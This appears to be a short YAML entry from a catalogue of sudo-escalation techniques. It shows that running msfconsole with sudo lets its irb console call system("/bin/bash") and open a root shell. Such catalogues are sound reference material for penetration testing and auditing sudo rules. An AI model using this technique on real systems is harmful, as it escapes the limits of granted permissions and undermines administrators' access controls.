---
functions:
  sudo:
    - code: |
        sudo msfconsole
        msf6 > irb
        >> system("/bin/bash")
---
